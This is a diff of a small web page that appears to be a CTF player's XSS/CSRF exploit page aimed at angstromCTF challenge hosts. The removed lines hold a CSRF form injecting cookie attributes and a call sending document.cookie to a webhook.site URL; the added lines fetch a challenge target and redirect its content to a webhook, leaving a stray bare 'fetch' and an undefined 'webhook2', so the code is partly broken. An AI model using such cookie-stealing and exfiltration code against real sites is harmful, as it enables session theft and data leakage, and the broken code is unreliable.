@@ -1,17 +1,13 @@
 ---
-title: "xss"
-permalink: /xss/
-layout: xss
+title: "xss3"
+permalink: /xss3/
+layout: xss3
 ---
 
 
 <div id="container">
     <h1>Welcome to this "maybe xss" program</h1>
 </div>
-<form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
-    <input name="passcode" value="; secure; samesite=none">
-</form>
-
 
 <script>
     function load(data) {
@@ -29,20 +25,14 @@ layout: xss
         /*fetch(webhook + payload).then(res => console.log("DONE", res));*/
         document.location = webhook + payload;
     }
-
-    let url = "http://127.0.0.1:1337/api/entries";
-    let url2 = "https://app.hackthebox.com/";
-    let jsonProvaUrl = "https://jsonplaceholder.typicode.com/todos/1";
-    let webhook = "https://webhook.site/654e914a-5c8c-46ae-bcf0-6b80c70bb7c8/";
-    let webhook2 = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=";
-    fetch(webhook + "cookie=" + document.cookie);
+    let target = "https://sustenance.web.actf.co/"
+    let webhook = "https://webhook.site/5c2aefaa-b175-4b8e-b48e-28649c9e1a80/";
 
     /*let options = {
         mode: 'no-cors' // 'cors' by default
     };*/
-
-    /*fetch(jsonProvaUrl)
+    fetch
+    fetch(target + "")
         .then(res => { console.log(res); return res.text(); })
-        .then(text => { console.log(text); getFlag(webhook2, text) }); */
-
+        .then(text => { console.log(text); getFlag(webhook2, text) })
 </script>
